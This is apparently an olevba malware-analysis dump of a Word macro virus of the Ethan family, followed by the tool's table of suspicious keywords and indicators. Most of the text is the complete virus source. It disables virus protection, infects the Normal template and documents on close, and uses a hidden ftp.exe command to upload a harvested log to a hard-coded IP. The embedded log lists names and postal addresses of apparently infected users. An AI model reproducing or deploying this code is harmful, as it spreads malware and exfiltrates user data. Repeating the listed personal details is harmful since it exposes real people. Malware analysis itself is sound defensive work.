olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan-based-1abf840a0a5c680db2ab495d223a9a19fba15eab
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan-based-1abf840a0a5c680db2ab495d223a9a19fba15eab - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
s = ActiveDocument.Saved
Application.EnableCancelKey = Not -1
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
Randomize
If Dir("c:\ethan.___", 6) = "" Then
Open "c:\ethan.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\ethan.___", 6
End If
If Dir("c:\class.sys") <> "" Then Kill "c:\class.sys"
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
Set t = ActiveDocument.VBProject.VBComponents.Item(1)
Else
t = ""
End If
If t <> "" Then
Open "c:\ethan.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:16:41 AM - Wednesday, 23 Dec 1998
' BCBSA
'



' 01:30:35 PM - Wednesday, 30 Dec 1998
' BCBSA
'



' 01:36:45 PM - Monday, 4 Jan 1999
' Sue Rosinski
'



' 03:03:59 PM - Tuesday, 5 Jan 1999
' BCBSA
'



' 01:52:36 PM - Monday, 18 Jan 1999
' David W. Nelson
' Belden Enterprises, Inc.
' 1835 W. Roscoe St.
' Chicago, IL  60657



' 11:27:09 AM - Wednesday, 20 Jan 1999
' Tim Henthorn
'



' 10:34:42 AM - Thursday, 28 Jan 1999
' Shirley Moran
'



' 11:51:36  - Tuesday, 2 Feb 1999
' Jan Tissera
'



' 11:09:36 AM - Wednesday, 10 Feb 1999
' SALES AND MARKETING
'



' 03:58:57 PM - Friday, 12 Feb 1999
' FOOD & BEVERAGE
'



' 05:40:20 PM - Friday, 12 Feb 1999
' FOOD & BEVERAGE
'



' 12:18:32 AM - Wednesday, 1 Jan 1997
' Ricardo Calixto Gomecua
' FR. BENILDA GOMECUA
'       142 FORTUNA ST
'       PASAY CITY M.M.
'       PHILIPPINES



' 07:59:16 PM - Thursday, 4 Mar 1999
' john
'



' 10:28:43 AM - Tuesday, 9 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 05:30:17 PM - Sunday, 7 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 03:37:35 PM - Thursday, 11 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 04:49:35 PM - Sunday, 14 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 12:38:48 PM - Sunday, 28 Feb 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 02:22:35 PM - Monday, 1 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 08:41:52 PM - Thursday, 25 Mar 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 03:37:33 PM - Tuesday, 6 Apr 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 04:29:14 PM - Thursday, 30 Apr 1998
' Michael T. Leonardo
'



' 01:57:55 PM - Thursday, 15 Apr 1999
' Buds
'



' 12:15:20 PM - Wednesday, 19 May 1999
' O.B.1. Canobi
' Ritchie A. Bejerano
' 246 Don Alfaro St. Tetuan
' Zamboanga City



' 08:14:23 PM - Tuesday, 3 Aug 1999
' Mr. Arnold Pascion
'



' 11:14:20 AM - Monday, 16 Aug 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 11:04:28 AM - Wednesday, 18 Aug 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 05:26:11 PM - Monday, 4 Oct 1999
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



' 06:04:22 PM - Thursday, 7 Oct 1999
' netzilla
'



' 02:54:57 AM - Wednesday, 25 Oct 2000
' Dominic Rey E. Lim
'



' 04:53:56 PM - Wednesday, 22 Nov 2000
' B
'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

